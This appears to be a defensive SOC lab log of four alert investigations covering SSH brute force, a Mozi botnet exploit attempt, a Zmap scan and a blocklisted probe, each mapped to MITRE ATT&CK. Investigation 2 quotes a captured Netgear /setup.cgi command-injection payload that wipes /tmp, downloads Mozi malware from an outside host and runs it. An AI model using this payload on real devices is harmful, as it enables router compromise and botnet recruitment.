## Investigation 1 — SSH Brute Force from China

**Date:** 26 May 2026
**Rule:** 100001 — SOC-LAB: SSH Brute Force
**Level:** 10
**Source IP:** 114.220.238.224 (Jiangsu Province, China)

**What happened:**
Automated SSH brute force attack cycling through multiple usernames in under 60 seconds. Incrementing source ports confirm automated tooling.

**Attack timeline:**
```
16:56:06  Invalid user "tauro"    port 40214 → Disconnected
16:56:30  Invalid user "ricardo"  port 46050 → Disconnected
16:56:57  Invalid user "gituser"  port 51767 → Blocked
```

**MITRE ATT&CK:** T1110 — Brute Force (Credential Access)

**Verdict:** True Positive — automated credential stuffing

**Key observation:** The usernames tauro, ricardo, and gituser suggest the attacker is using a Latin American server configuration wordlist. The presence of "gituser" specifically targets developer servers.

## Investigation 2 — Mozi Botnet Exploit Attempt

**Date:** 24 June 2026
**Rule:** 100303 — ET EXPLOIT
**Level:** 12 (Critical)
**Source IP:** 110.36.90.169

**What happened:**
Automated exploit attempt targeting the Netgear DGN Remote Command Execution vulnerability (CVE targeting `/setup.cgi`). The attacker attempted to download and execute Mozi botnet malware.

**Malicious payload:**
```
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=
  rm -rf /tmp/*;
  wget http://110.36.90.169:38608/Mozi.m -O /tmp/netgear;
  sh netgear
```

**Command breakdown:**
- `rm -rf /tmp/*` — clear evidence of previous infections
- `wget http://110.36.90.169:38608/Mozi.m` — download Mozi malware
- `sh netgear` — execute immediately

**Result:** Server returned 301 redirect. Not a Netgear router — exploit failed.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application (Initial Access)

**Mozi malware context:** Mozi is a peer-to-peer IoT botnet active since 2019. It targets routers and IoT devices, recruiting them for DDoS attacks and further propagation.

**Verdict:** True Positive — active botnet infrastructure, exploit unsuccessful

## Investigation 3 — Zmap Internet Scanner

**Date:** 18 June 2026
**Rule:** 100302 — ET SCAN
**Level:** 8 (Medium)
**Source IP:** 45.33.109.18

**What happened:**
Automated internet-wide port scan using Zmap — one of the fastest mass scanning tools available. The scanner sent a GET request to port 80 to identify running web services.

**HTTP details:**
```
User-Agent: Mozilla/5.0 zgrab/0.x
Method: GET
URL: /
Protocol: HTTP/1.1
Response: 301 redirect to https://wazuh.yourdomain.com
```

**MITRE ATT&CK:** T1595 — Active Scanning, T1046 — Network Service Discovery

**Verdict:** True Positive — automated reconnaissance. Low immediate risk. The 301 redirect exposed the Wazuh domain name to the scanner's logs.

## Investigation 4 — DShield Blocklisted Source

**Date:** 18 June 2026

**Level:** 10 (High)
**Source IP:** 66.132.172.143

**What happened:**
Single TCP SYN packet to port 22 from a source IP on the DShield blocklist (updated 17 June 2026 — the day before this alert). Classic port probe before a potential brute force attempt.
